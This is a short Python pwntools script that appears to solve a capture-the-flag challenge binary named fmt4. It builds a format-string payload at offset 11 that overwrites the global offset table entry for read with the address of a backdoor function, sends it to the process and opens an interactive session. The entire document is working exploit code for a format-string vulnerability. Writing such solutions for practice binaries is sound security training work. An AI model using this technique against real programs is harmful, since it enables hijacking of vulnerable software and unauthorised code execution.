from pwn import *
p=process("./pwn/string/fmt-4/fmt4")

elf = ELF("./pwn/string/fmt-4/fmt4")
backdoor_addr = elf.symbols['backdoor']

# Create the payload
payload = fmtstr_payload(11, {elf.got['read']: backdoor_addr})
log.info(f'Payload: {payload}')
# Send the payload
p.sendline(payload)

# Switch to interactive mode
p.interactive()